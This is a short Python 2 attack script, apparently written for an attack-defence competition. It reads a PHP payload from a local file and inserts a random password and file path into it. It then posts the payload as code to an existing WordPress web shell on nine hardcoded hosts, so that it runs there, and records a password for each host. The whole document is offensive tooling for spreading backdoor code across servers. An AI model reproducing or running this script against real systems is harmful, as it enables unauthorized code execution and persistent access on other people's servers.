#!/usr/bin/env python
import requests
import random

ip_pass = {}
shell_pass = []

shell_address = '/WordPress/shell.php'

ips = ['40.10.10.57',
       '40.10.10.26',
       '40.10.10.11',
       '40.10.10.62',
       '40.10.10.24',
       '40.10.10.59',
       '40.10.10.47',
       '40.10.10.42',
       '40.10.10.15',
       ]


def get_shell(file):
    return open(file).read()


def random_str(randomlength=6):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    for i in range(randomlength):
        str += chars[random.randint(0, length)]
    return str


def fuck(ip, password):
    global filepath
    # payload = % password
    payload = get_shell('s4.php')
    payload = payload.replace('passwordpassword', password).replace(
        '<?php', '').replace('?>', '').replace('filepathfilepath', filepath)
    try:
        ip_pass[ip] = password
        data = {'1': payload}
        r = requests.post('http://' + ip + shell_address, data=data, timeout=3)
        if r.status_code == '200':
            print(ip + 'shell exist')
            ip_pass[ip] = password
    except requests.exceptions.ReadTimeout, e:
        print('except : ' + e)
        pass

if __name__ == '__main__':
    filepath = ''
    for ip in ips:
        password = random_str()
        fuck(ip, password)
